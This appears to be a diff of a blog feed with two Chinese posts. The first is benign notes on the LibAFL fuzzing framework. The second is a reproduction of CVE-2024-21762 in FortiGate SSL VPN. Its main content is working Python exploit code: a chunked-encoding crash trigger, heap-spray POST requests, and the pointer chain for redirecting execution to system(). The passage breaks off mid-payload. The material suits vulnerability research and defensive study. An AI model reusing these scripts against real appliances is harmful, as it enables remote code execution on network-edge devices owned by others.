+<li>任何 <code>Observer</code> 都可以充当影子观察者，如 <code>CmpLogObserver</code>，其数据主要用于指导后续变异而非立即的“有趣性”判断。</li>
+</ul>
+</li>
+</ul>
+<h2 id="libafl简短介绍">LibAFL简短介绍</h2>
+<p>方便向面试官讲解的，感觉写的还是不够通俗，很多面试官其实并不了解，甚至有的不知道模糊测试的概念，后续可能也应该添加上</p>
+<p>LibAFL是一个Fuzz框架，它的核心理念是模块化、可组合性、高性能、可扩展性。</p>
+<p>它主要是提供了一个灵活的框架，让我们可以方便地构建定制化的 Fuzzer，而不需要从零开始。</p>
+<ol>
+<li>
+<p>Fuzzer</p>
+<p>最核心的部分是Fuzzer，是整个 Fuzzing 活动 (fuzz campaign) 的<strong>主要控制中心和执行者</strong>。它将所有其他核心组件有机地组织和驱动起来，以执行完整的 Fuzzing 循环。</p>
+<p>以<code>StdFuzzer</code>为例，这也是LibAFL提供的一个默认、标准的Fuzzer实例，主要的流程就是从调度器 (<code>Scheduler</code>) 获取下一个要测试的输入，执行该输入（通过 <code>Executor</code>），评估执行结果（通过 <code>Feedback</code> 和 <code>Observers</code>），并将有趣的输入添加回语料库 (<code>Corpus</code>)。</p>
+<p>但虽然创建的时候，标准StdFuzzer的new方法需要的三个参数为我刚刚说的scheduler, feedback, objective，但具体循环执行的loop方法中，其实用到了更顶层的一些模块，比如stages、executor、state、eventmanager</p>
+<p>让我们先从state说起</p>
+</li>
+<li>
+<p>state</p>
+<p><code>State</code> 是 LibAFL Fuzzing 框架的<strong>核心数据中心和状态管理器</strong>。它在整个 Fuzzing 运行期间负责<strong>跟踪、存储和管理所有动态数据、配置以及 Fuzzing 进度</strong>。几乎所有其他 LibAFL 组件（如 <code>Fuzzer</code> 核心、<code>EventManager</code>、<code>Executor</code>、<code>Feedback</code>、<code>Corpus</code>、<code>Mutator</code>、<code>Stage</code>）都会与 <code>State</code> 进行交互。</p>
+</li>
+<li>
+<p>stages</p>
+<p>一个 <strong><code>Stage</code></strong> 代表 Fuzzing 过程中的一个<strong>不同操作步骤或技术</strong>。它通常针对语料库 (<code>Corpus</code>) 中的单个输入（测试用例）进行处理，目的是分析、修改该输入，或者利用它来创造新的、有趣的测试用例，或为现有测试用例添加元数据。可以将 Fuzzing 过程看作一个流水线，每个 <code>Stage</code> 是流水线中的一个环节。</p>
+<p>这里有很多有趣的部分，最常见的就是</p>
+<ul>
+<li>mutational变异阶段，核心步骤就是获取输入，使用 <code>Mutators</code> (变异器) 进行多次随机变异，执行变异后的输入，并由 <code>Feedbacks</code> (反馈) 评估是否“有趣” (如产生新覆盖或崩溃)。</li>
+<li>其他还有power，它可以根据“能量”或优先级分配 Fuzzing 精力（如变异次数）给不同的输入，一般在 <code>Calibration Stage</code> 之后。</li>
+<li>至于calibrate，主要就是收集目标执行的初始指标，如平均执行时间、初始覆盖图状态/大小，为后续的 Feedback 和 Scheduler 提供基准数据。</li>
+<li>其他还有<code>tracing</code>， 追踪目标执行，用元数据（如 <code>CmpLog</code> 比较日志）丰富测试用例。</li>
+<li><code>shadow</code>，这个我用的不多，感觉主要就是独立于主执行路径之外，一般我配合cmplog用</li>
+<li><code>generation</code>，生成新输入</li>
+</ul>
+</li>
+<li>
+<p>eventsmanager</p>
+<p><code>EventManager</code> 是 LibAFL 中负责<strong>通信和协调</strong>的核心组件。它管理 Fuzzer 实例之间或 Fuzzer 内部组件之间的<strong>事件流</strong>。这些事件可以是新发现的测试用例、代码覆盖信息、统计数据、崩溃报告、日志消息等。</p>
+<ul>
+<li>最简单的就是simple，主要用来日志输出</li>
+<li>别的感觉用来多线程或者多个物理机同步多一点</li>
+<li>还有Launcher，用来<strong>并行启动和管理多个 Fuzzer 实例</strong>的</li>
+<li>其他就是实现主从架构的多一点</li>
+</ul>
+</li>
+<li>
+<p>还有scheduler，Fuzzer新建实例的时候的必需品</p>
+<p><code>Scheduler</code> 决定了 Fuzzer <strong>如何以及按什么顺序从语料库 (<code>Corpus</code>) 中选择下一个测试用例 (Testcase) 进行 Fuzzing</strong>。我认为它核心的理念就是通过智能地选择和排序语料库中的输入，最大化 Fuzzing 的效果，避免在低价值的输入上浪费过多的时间和计算资源。</p>
+<ul>
+<li>最简单的就是queue，对列调度，先进先出嘛</li>
+<li>还有power，能量调度，给语料库输入根据覆盖率还有执行时间什么的分配能量，按能量提高输入被选中的概率</li>
+<li>accounting 进行更细致的覆盖率审计，以确保 Fuzzer 在所有已发现的路径上都花费了足够的精力，并优先探索那些能够覆盖到“稀有”或“昂贵”路径的输入。</li>
+<li>还有纯靠概率的，提高随机性</li>
+<li>其他好像还有打分的，加权的，差不多就这些吧</li>
+</ul>
+</li>
+<li>
+<p>executor</p>
+<p>LibAFL中接收输入 (Input)，并在目标程序中实际执行这个输入的组件，我觉得还是起一个桥梁作用，负责启动目标、传递输入、监控执行过程，并最终报告执行结果</p>
+<ul>
+<li>
+<p>具体来说，感觉就三种最常用的，比如InProcessExecutor，类似 libFuzzer，直接在 Fuzzer 自身的进程空间内调用一个目标函数 (harness function)。速度快，无进程切换开销，但目标崩溃会导致 Fuzzer 进程一同崩溃，通常需要配合可重启的事件管理器</p>
+</li>
+<li>
+<p>InprocessForkExecutor</p>
+<p>每次执行 harness 函数前，Fuzzer 主进程会调用 <code>fork()</code> 创建一个子进程，实际的目标函数调用在子进程中进行。这就让目标崩溃只影响子进程，但每次 <code>fork()</code> 仍有开销，通常比 <code>forkserver</code> 慢。</p>
+</li>
+<li>
+<p>forkserver</p>
+<p>目标程序启动后进入一个特殊的 &quot;forkserver&quot; 模式。Fuzzer 命令此服务器 <code>fork()</code> 子进程来执行每个输入。目标程序的核心初始化仅发生一次，后续 <code>fork()</code> 开销极小，效率高。</p>
+</li>
+</ul>
+<p>别的好像用的就不是很多了，哦，还有shadow，配合shadow observer工作，用来指导变异</p>
+<p>别的好像就剩observer跟monitor、feedback了</p>
+</li>
+<li>
+<p>monitor</p>
+<p>最好说，就是显示信息嘛</p>
+</li>
+<li>
+<p>observer</p>
+<p>主要用来观察，最重要的当然是</p>
+<ul>
+<li>
+<p>map</p>
+<p>map observer主要观察一块共享内存区域（“地图”），这块地图由被<strong>插桩的目标程序</strong>在执行时更新，用以记录代码执行信息，最常见的是<strong>代码覆盖率</strong>。</p>
+</li>
+<li>
+<p>其他还有cmp，就是记录cmplog，然后结合上面的executor对Mutator做指导，比如我们程序比较A=B的时候，它会偷偷把A跟B记下来，马上输入直接给你换成A或者B这样</p>
+</li>
+<li>
+<p>还有concolic，符号化执行与具体执行相结合，记录执行路径，然后求解分析条件，找到新值</p>
+</li>
+</ul>
+</li>
+<li>
+<p>哦，还有Mutator，对输入进行修改和转换</p>
+<ul>
+<li>基础的就是字节基本变异</li>
+<li>还有havoc变异</li>
+<li>别的就是基于token的变异，这里可以配合cmplog进行</li>
+<li>别的还有mopt变异</li>
+<li>还有语法感知变异</li>
+<li>还有学习输入结构，生成符合结构的变异输入</li>
+</ul>
+</li>
+<li>
+<p>还有feedback，判断输入是否有趣的</p>
+</li>
+</ol>
+<ul>
+<li>基于代码覆盖率</li>
+<li>基于执行退出</li>
+<li>基于时间</li>
+<li>基于特定值/模式</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2024-21762 漏洞复现]]></title>
+        <id>https://augu5tu.github.io/post/cve-2024-21762-reproduction/</id>
+        <link href="https://augu5tu.github.io/post/cve-2024-21762-reproduction/">
+        </link>
+        <updated>2024-06-07T09:16:28.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="静态分析">静态分析</h3>
+<p>这是一个越界写入漏洞，根据前期调研，可以用chunk length字段传入很多个0，0的长度大于剩余缓冲区长度的1/2时，就会触发越界写入</p>
+<p>找到漏洞位置</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240517145406131.png" alt="image-20240517145406131" loading="lazy"></figure>
+<p>这里与修复后版本进行对比，发现主要有两个修改点</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240620110653034.png" alt="image-20240620110653034" loading="lazy"></figure>
+<ul>
+<li>解析chunk格式时，，检查分块长度是否大于16，大于16认为是非法的chunk length。</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240620110717764.png" alt="image-20240620110717764" loading="lazy"></figure>
+<ul>
+<li>
+<p>读取chunk trailer（数据传输结束标志，大小为0的块）时，写入<code>\r\n</code>的偏移<code>line_off</code>的赋值来源</p>
+<p>修复前<code>line_off</code>的值来源于<code>*(_QWORD *)(a1 + 744)</code>，修复后<code>line_off</code>为<code>ap_getline</code>的返回值。</p>
+</li>
+</ul>
+<p>对具体代码进行分析</p>
+<pre><code>if ( ap_getline(*(a1 + 760), v26, *(*(a1 + 8) + 40LL), 1LL) &lt;= 0 )
+              {
+                if ( sub_16DCA50(*(*(a1 + 8) + 40LL)) - 1 &lt;= 4 )
+                  return -1LL;
+                break;
+              }
+</code></pre>
+<p>这里先用<code>ap_getline</code>检查<code>chunk</code>长度，如果≤0，会继续检查，不通过会返回-1，结束</p>
+<p><code>sub_16DCA50</code>简单分析了一下，根据动调一般不会有什么影响，大概是检查偏移 160 字节处的值，并将其转换和处理后返回（整数右移 3 位后，转换为 16 位整数，再转换为无符号 32 位整数）。如果传入的指针无效（即 <code>a1</code> 为零），则返回一个特殊值（<code>4294967292LL</code>）</p>
+<p>在检查结束以后，有一段代码</p>
+<pre><code>v27 = *(_DWORD *)(a1 + 752);  // 获取当前chunk剩余字节数
+line_off = *(_QWORD *)(a1 + 728);  // 当前行的偏移
+v29 = v27 - 1;  // 减去1字节，可能用于处理行末的CRLF
+if ( line_off != v29 )
+{
+  v30 = *(_QWORD *)(a1 + 760);  // 缓冲区起始地址
+  *(_QWORD *)(a1 + 728) = line_off + 1;
+  *(_BYTE *)(v30 + line_off) = 13;  // 写入0x0d (CR)
+  v31 = *(_QWORD *)(a1 + 728);  // 更新偏移
+  v32 = *(_QWORD *)(a1 + 760);  // 缓冲区起始地址
+  *(_QWORD *)(a1 + 728) = v31 + 1;
+  *(_BYTE *)(v32 + v31) = 10;  // 写入0x0a (LF)
+  v29 = *(_QWORD *)(a1 + 728);  // 更新偏移
+  v27 = *(_DWORD *)(a1 + 752);  // 更新chunk剩余字节数
+}
+</code></pre>
+<p>大概逻辑为，在读取chunk trailer时，根据chunk length的字段，如果发现当前chunk已经处理完（即<code>v27</code>等于0），会在缓冲区适当位置写入0x0d（CR）和0x0a（LF），表示chunk的结束。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240517143444874.png" alt="image-20240517143444874" loading="lazy"></figure>
+<p>总结：</p>
+<ul>
+<li>
+<p>如果chunk length的字段解码后为0的话, 就会从chunk trailer开始读, 而chunk trailer是由ap_getline读取的</p>
+</li>
+<li>
+<p>读取chunk trailer的时候,会根据chunk length的长度写入<code>0x0d,0x0a</code></p>
+</li>
+<li>
+<p>如果在chunk length上传入0的长度大于剩余缓冲区长度的1/2时,就会触发越界写<code>0x0a0d</code></p>
+</li>
+</ul>
+<p>通过栈回溯，查看上级函数，有如下内容</p>
+<pre><code>char v4[8200]; // [rsp+0h] [rbp-2020h] BYREF
+</code></pre>
+<ul>
+<li>
+<p>因为是64位，可知偏移0x2028的位置保存了返回地址</p>
+</li>
+<li>
+<p>如果在0x202e处写入，那么0x2028处保存的返回地址的最后两个字节将会被替换</p>
+</li>
+<li>
+<p>因为大端寻址，原来应该是xxxxxx0d0a，最后应该成功触发溢出，并显示非法地址是0x0d0axxxxxx</p>
+</li>
+</ul>
+<h3 id="触发crash">触发crash</h3>
+<p>用一个简单的脚本触发crash</p>
+<pre><code>import socket
+import ssl
+
+def creat_ssock(hostname, port):
+    context = ssl._create_unverified_context() 
+    sock = socket.create_connection((hostname, port))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+    return ssock
+
+hostname = '192.168.150.9' 
+port = 10443
+
+pkt = b&quot;&quot;&quot;\
+GET /  HTTP/1.1
+Host: %s
+Transfer-Encoding: chunked
+
+%s\r\n%s\r\n\r\n&quot;&quot;&quot; % (hostname.encode(), b&quot;0&quot; * ((0x202e // 2) - 2), b&quot;a&quot;)
+
+ssock = creat_ssock(hostname, port)
+ssock.send(pkt)
+
+response = ssock.recv(4096)
+print(response.decode('utf-8'))
+
+ssock.close()
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240517162732131.png" alt="image-20240517162732131" loading="lazy"></figure>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="尝试劫持rbp">尝试劫持rbp</h4>
+<p>通过覆盖rbp的低字节，使rbp刚好指向可控的内存区域</p>
+<ul>
+<li><code>rbp</code>为0x2020，写入0x2026个，则<code>rbp</code>地址最后两个字节会被覆盖为<code>\r\n(0d0a)</code></li>
+</ul>
+<p>但尝试后发现，即使覆盖了栈上的rbp，也无法劫持rsp和rip，甚至程序不会产生崩溃</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240517165130651.png" alt="image-20240517165130651" loading="lazy"></figure>
+<p>向上回溯，找到<code>sub_17F5AC0</code>的父函数<code>sub_180AA90</code>，该函数在返回时并没有调用<code>leave ret</code>来恢复rsp，而是直接<code>add rsp, 0x18</code>，因此无法达到预期的效果。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240517164731199.png" alt="image-20240517164731199" loading="lazy"></figure>
+<h4 id="堆喷方法">堆喷方法</h4>
+<p>但此函数在栈上保存了rbx、r12-r15五个寄存器的值，并在函数返回时恢复这些寄存器，继续回溯，可以看到r13中保存的正是参数<code>a1</code>。</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240517170331774.png" alt="image-20240517170331774" loading="lazy"></figure>
+<p>a1是一个结构体指针，通过调试也可以看出栈上保存的<code>r13</code>是一个堆地址。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240517170725549.png" alt="image-20240517170725549" loading="lazy"></figure>
+<p>​	如果通过越界写覆盖r13最后两个字节，那么<code>sub_180AA90</code>函数返回时恢复r13寄存器，就可以篡改<code>a1</code>指针的值。如果能够对堆内存进行布局，使得a1指向提前布置好的内存区域，那么就可以劫持整个a1结构体。</p>
+<p>​	然后大概看了一下<code>sub_1A27650</code>和<code>sub_1A26040</code>的代码逻辑，感觉a1多级结构体成员的动态函数调用还挺多，这样劫持a1会有更多的利用机会。</p>
+<h3 id="劫持结构体">劫持结构体</h3>
+<h5 id="结构体大小获取">结构体大小获取</h5>
+<p>需要堆喷来调整堆上结构的，所以首先要知道该结构体的大小</p>
+<p>一开始断点下错了，分析了一下调用链</p>
+<h6 id="调用链分析">调用链分析</h6>
+<p>尝试通过栈回溯查看，不能成功在此处下断点</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240517164731199.png" alt="image-20240517164731199" loading="lazy"></figure>
+<p>找到原因，此处预计判断条件错误，不会走到<code>AB39</code>（最后发现是请求脚本写错了）</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240527200536384.png" alt="image-20240527200536384" loading="lazy"></figure>
+<p>调用链：</p>
+<ul>
+<li>180C1B0
+<ul>
+<li>180AA90</li>
+</ul>
+</li>
+</ul>
+<p>从<code>sub_180AA90</code>返回到<code>sub_180C1B0</code>有如下语句</p>
+<pre><code>.text:000000000180C1B0                 mov     edx, 1
+.text:000000000180C1B5                 mov     esi, r14d
+.text:000000000180C1B8                 mov     rdi, r13
+.text:000000000180C1BB                 call    sub_180AA90
+.text:000000000180C1C0                 test    eax, eax
+</code></pre>
+<p>这里重新call了一遍<code>sub_180AA90</code>，并且传入的rdi是从r13来恢复的。该参数对应了一个大结构体。</p>
+<p><code>sub_180AA90</code>在返回时从栈上恢复了r13，且通过动调可以发现r13的初始值位于堆上。</p>
+<pre><code>.text:000000000180AB39 loc_180AB39:                            ; CODE XREF: sub_180AA90+342↓j
+.text:000000000180AB39                                         ; sub_180AA90+36A↓j ...
+.text:000000000180AB39                 add     rsp, 18h
+.text:000000000180AB3D                 pop     rbx
+.text:000000000180AB3E                 pop     r12
+.text:000000000180AB40                 pop     r13
+.text:000000000180AB42                 pop     r14
+.text:000000000180AB44                 pop     r15
+.text:000000000180AB46                 pop     rbp
+.text:000000000180AB47                 retn
+</code></pre>
+<pre><code>.text:000000000180C288 loc_180C288:                            ; CODE XREF: sub_180C240+6D↓j
+.text:000000000180C288                 mov     rdi, r12
+.text:000000000180C28B                 call    sub_181B8E0
+.text:000000000180C290                 mov     rdi, r12
+.text:000000000180C293                 mov     esi, r13d
+.text:000000000180C296                 mov     r12, rbx
+.text:000000000180C299                 call    sub_180C0A0
+.text:000000000180C29E                 mov     rax, [rbx+18h]
+.text:000000000180C2A2                 lea     rbx, [rax-18h]
+.text:000000000180C2A6                 cmp     r12, offset qword_BF042C0
+.text:000000000180C2AD                 jnz     short loc_180C288
+</code></pre>
+<h6 id="查看结构体分配位置">查看结构体分配位置</h6>
+<p>经过观察，可被劫持的<code>r13</code>保存的结构体在不同请求中的分配几乎都在同一个位置，因此可以直接下watch断点来找到它被分配的代码位置。</p>
+<img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240529152353608.png" alt="image-20240529152353608" style="zoom: 33%;" />
+<img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240529152604553.png" alt="image-20240529152604553" style="zoom: 33%;" />
+<pre><code>pwndbg&gt; watch *0x7ff2b8c54800
+Hardware watchpoint 4: *0x7ff2b8c54800
+</code></pre>
+<img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240529153022964.png" alt="image-20240529153022964" style="zoom:67%;" />
+<p>断下来之后查看调用栈，发现是<code>je_calloc</code>开的空间</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240529153352802.png" alt="image-20240529153352802" loading="lazy"></figure>
+<p>找到<code>je_calloc@plt</code>调用位置后，下断点查看</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240529154643089.png" alt="image-20240529154643089" loading="lazy"></figure>
+<p><code>je_calloc</code>原型如下</p>
+<pre><code>void *je_calloc(size_t nmemb, size_t size);
+</code></pre>
+<p>所以结构体大小是0x730</p>
+<h5 id="尝试布置堆块">尝试布置堆块</h5>
+<p>这里使用了一个GDB脚本在分配大小接近0x730时自动打印对je_malloc和je_calloc的调用</p>
+<pre><code>b je_malloc if (($rdi &gt;= 0x700) &amp;&amp; ($rdi &lt;= 0x800))
+commands
+    silent
+    set $malloc_size = $rdi
+    c
+end
+
+b *(je_malloc+205)
+commands
+    silent
+    if (($malloc_size &gt;= 0x700) &amp;&amp; ($malloc_size &lt;= 0x800))
+        printf &quot;je_malloc: %p : %p : %d\n&quot;, $rax, ($rax + $malloc_size), $malloc_size
+        set $malloc_size = 0
+    end
+    c
+end
+
+b je_calloc if (($rsi &gt;= 0x700) &amp;&amp; ($rsi &lt;= 0x800))
+commands
+    silent
+    set $calloc_size = $rsi
+    c
+end
+
+b *(je_calloc+340)
+commands
+    silent
+    if (($calloc_size &gt;= 0x700) &amp;&amp; ($calloc_size &lt;= 0x800))
+        printf &quot;je_calloc: %p : %p : %d\n&quot;, $rax, ($rax + $calloc_size), $calloc_size
+        set $calloc_size = 0
+    end
+    c
+end
+
+set $malloc_size = 0
+set $calloc_size = 0
+</code></pre>
+<p>只看到一个分配</p>
+<pre><code>je_calloc: 0x7f1ecfc54800 : 0x7f1ecfc54f30 : 1840
+</code></pre>
+<p>从以前的攻击中知道，FortiGate在解析每个表单post参数时会创建单独的分配，所以感觉可以对具体分配控制的细一点，发了一个带五个参数的请求，每个参数长度都为目标分配大小。</p>
+<p>具体脚本</p>
+<pre><code class="language-Python">import socket
+import ssl
+
+def create_ssock(hostname, port):
+    context = ssl._create_unverified_context()
+    sock = socket.create_connection((hostname, port))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+    return ssock
+
+hostname = '192.168.150.9'
+port = 10443
+
+# 修改body内容
+body = (b&quot;A&quot; * 1840 + b&quot;=&amp;&quot;) * 5
+
+# 构造POST请求的数据
+data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.1.229\r\n&quot;
+data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
+data += b&quot;\r\n&quot;
+data += body
+
+# 创建SSL套接字并发送数据
+ssock = create_ssock(hostname, port)
+ssock.send(data)
+
+# 接收响应
+response = ssock.recv(4096)
+print(response.decode('utf-8'))
+
+# 关闭套接字
+ssock.close()
+</code></pre>
+<p>结果如下</p>
+<pre><code>je_calloc: 0x7f1ecfc54800 : 0x7f1ecfc54f30 : 1840
+je_malloc: 0x7f1eceff5800 : 0x7f1eceff5f50 : 1872
+je_malloc: 0x7f1ecf016000 : 0x7f1ecf016750 : 1872
+je_malloc: 0x7f1ecf015800 : 0x7f1ecf015f50 : 1872
+je_malloc: 0x7f1ecf01e800 : 0x7f1ecf01ef50 : 1872
+je_malloc: 0x7f1ecefdf800 : 0x7f1ecefdff50 : 1872
+je_malloc: 0x7f1ecf01f800 : 0x7f1ecf01ff50 : 1872
+je_malloc: 0x7f1ecf01d400 : 0x7f1ecf01db50 : 1872
+je_malloc: 0x7f1ecf020800 : 0x7f1ecf020f50 : 1872
+je_malloc: 0x7f1ecf01d800 : 0x7f1ecf01df50 : 1872
+</code></pre>
+<p>malloc跟calloc大小不太一样，增加了32个字节（最后一列为10进制），但根据之前的分析，应该都能够分配大小相同（0x800）并且连续的堆块</p>
+<p>通过以上测试，调整一下大小，最终形成如下两个请求</p>
+<pre><code class="language-Python">import socket
+import ssl
+import time
+
+def create_ssock(hostname, port):
+    context = ssl._create_unverified_context()
+    sock = socket.create_connection((hostname, port))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+    return ssock
+
+TARGET = '192.168.150.9'
+PORT = 10443
+ssock1 = create_ssock(TARGET, PORT)
+# 布置堆块
+body = (b&quot;A&quot;*1901 + b&quot;=&quot; + b&quot;B&quot;*1901 + b&quot;&amp;&quot;)*15
+
+data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.150.9\r\n&quot;
+data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
+data += b&quot;\r\n&quot;
+data += body
+
+ssock1.sendall(data)
+
+time.sleep(1)
+ssock2 = create_ssock(TARGET, PORT)
+
+data  = b&quot;POST / HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.1.229\r\n&quot;
+data += b&quot;Transfer-Encoding: chunked\r\n&quot;
+data += b&quot;\r\n&quot;
+data += b&quot;0&quot;*4120 + b&quot;\0&quot;
+data += b&quot;A&quot;*1 + b&quot;\r\n\r\n&quot;
+ssock2.sendall(data)
+</code></pre>
+<p>第一个请求是为了布置堆</p>
+<p>第二个请求使用一开始计算的4120，在0x0a0d覆盖后下断点查看情况</p>
+<p>根据之前的梳理，<code>sub_16E6130</code>就是漏洞所在处，此处<code>0x0a0d</code>完成覆盖，选择在<code>0x17f5af6</code>处后下断点</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240530170835871.png" alt="image-20240530170835871" loading="lazy"></figure>
+<h6 id="写入地址错误">写入地址错误</h6>
+<p>发现因为大端的问题，0x0a0d写入地址错误</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240531131055713.png" alt="image-20240531131055713" loading="lazy"></figure>
+<h6 id="堆喷失败">堆喷失败</h6>
+<p>尝试进行调整，但调整成功以后发现没能成功喷到</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240531142725059.png" alt="image-20240531142725059" loading="lazy"></figure>
+<p>这里和同门讨论了一下，他用的另一种方法，溢出点不同，填充字符数量为4137，我尝试了一下确实成功了</p>
+<h6 id="探究原因">探究原因</h6>
+<p>尝试探究了一下具体原因，根据我们一开始堆喷的思路，a1指针的低字节被覆盖成<code>\r\n</code>后，可以恰好指向预先布置好的内存。这里我简单画了个图：</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240531144339860.png" alt="image-20240531144339860" loading="lazy"></figure>
+<p>为实现这一效果，需要达成如下条件：</p>
+<ol>
+<li>a1结构体地址比堆喷区域地址更高，并且二者间隔很小。</li>
+<li><code>0x7fxxxxxxx0a0d</code>一定指向伪造的结构体。</li>
+</ol>
+<p>我重新看了一下<code>r13</code>的地址和<code>rbp</code>寄存器，根据之前的调试经验，寄存器中地址在此处相对固定，跟<code>r13</code>相近的地址大概有如下几处</p>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240531140149721.png" alt="image-20240531140149721" loading="lazy"></figure>
+<p>也就是说，可用的偏移只有4137、4133、4121，这里我使用4121重新尝试了一下</p>
+<p>一开始堆喷没有成功喷到，堆喷成功率确实不是非常稳定</p>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240531132325247.png" alt="image-20240531132325247" loading="lazy"></figure>
+<p>继续尝试，成功劫持结构体</p>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240531140721537.png" alt="image-20240531140721537" loading="lazy"></figure>
+<p>又用4137尝试了一下，也能成功劫持</p>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240530162220602.png" alt="image-20240530162220602" loading="lazy"></figure>
+<p>这样就可以可靠地将r13指针重定向到能够控制的缓冲区。然后填充缓冲区，实现远程代码执行。</p>
+<p>最终劫持请求如下</p>
+<pre><code>import socket
+import ssl
+import time
+
+def create_ssock(hostname, port):
+    context = ssl._create_unverified_context()
+    sock = socket.create_connection((hostname, port))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+    return ssock
+
+TARGET = '192.168.150.9'
+PORT = 10443
+ssock1 = create_ssock(TARGET, PORT)
+
+body = (b&quot;A&quot;*1901 + b&quot;=&quot; + b&quot;B&quot;*1901 + b&quot;&amp;&quot;)*15
+
+
+data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.150.9\r\n&quot;
+data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
+data += b&quot;\r\n&quot;
+data += body
+
+ssock1.sendall(data)
+
+time.sleep(1)
+ssock2 = create_ssock(TARGET, PORT)
+
+data  = b&quot;POST / HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.1.229\r\n&quot;
+data += b&quot;Transfer-Encoding: chunked\r\n&quot;
+data += b&quot;\r\n&quot;
+data += b&quot;0&quot;*4121 + b&quot;\0&quot;
+#data += b&quot;0&quot;*4140 + b&quot;\0&quot;
+data += b&quot;A&quot;*1 + b&quot;\r\n\r\n&quot;
+ssock2.sendall(data)
+</code></pre>
+<pre><code>.plt:000000000043FDF0                 jmp     cs:off_42616F8
+.plt:000000000043FDF0 _system         endp
+</code></pre>
+<pre><code>000000000180AAAE                 mov     r13, [rdi+298h]
+
+000000000180AAC3                 mov     r15, [r13+70h]
+
+000000000180AAFD                 mov     rax, [rax+r15+20h]
+
+000000000180AB0B                 call    rax
+</code></pre>
+<pre><code>.plt:000000000043FDF0                 jmp     cs:off_42616F8
+.plt:000000000043FDF0 _system         endp
+
+.got.plt:00000000042616F8 off_42616F8     dq offset system        ; DATA XREF: _system↑r
+</code></pre>
+<p>这是最后一次解引用，所以我们有以下内容，分为两个步骤。</p>
+<pre><code>tmp0 = rax + r15 + 0x20 (0x042616F8)
+rax  = *tmp0            (0x0043FDF0)
+call rax
+</code></pre>
+<p>我们使用调试器逐步检查了代码，发现rax在这一点上通常是0x20，因此我们可以将其简化为以下内容。</p>
+<pre><code>tmp0 = r15 + 0x40 (0x042616F8)
+rax  = *tmp0      (0x0043FDF0)
+call rax
+</code></pre>
+<pre><code>tmp1 = r13 + 0x70 (0x00432F70)
+r15  = *tmp1      (0x042616B8)
+tmp0 = r15 + 0x40 (0x042616F8)
+rax  = *tmp0      (0x0043FDF0)
+call rax
+</code></pre>
+<p>0x042616F8-0x40=0x042616B8</p>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240607141340616.png" alt="image-20240607141340616" loading="lazy"></figure>
+<p>最后一步意味着我们只需要在rdi + 0x298处写入0x00432F00。因为我们控制了rdi指向的地方，所以应该没有问题。</p>
+<pre><code>tmp2 = rdi + 0x298
+r13  = *tmp2      (0x00432F00)
+tmp1 = r13 + 0x70 (0x00432F70)
+r15  = *tmp1      (0x042616B8)
+tmp0 = r15 + 0x40 (0x042616F8)
+rax  = *tmp0      (0x0043FDF0)
+call rax
+</code></pre>
+<pre><code>system_ptr = b&quot;%00%2f%43%00%00%00%00%00&quot; # 0x00432F00
+body = (b&quot;B&quot;*1165 + system_ptr + b&quot;B&quot;*713 + b&quot;=&amp;&quot;)*25
+
+data  = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
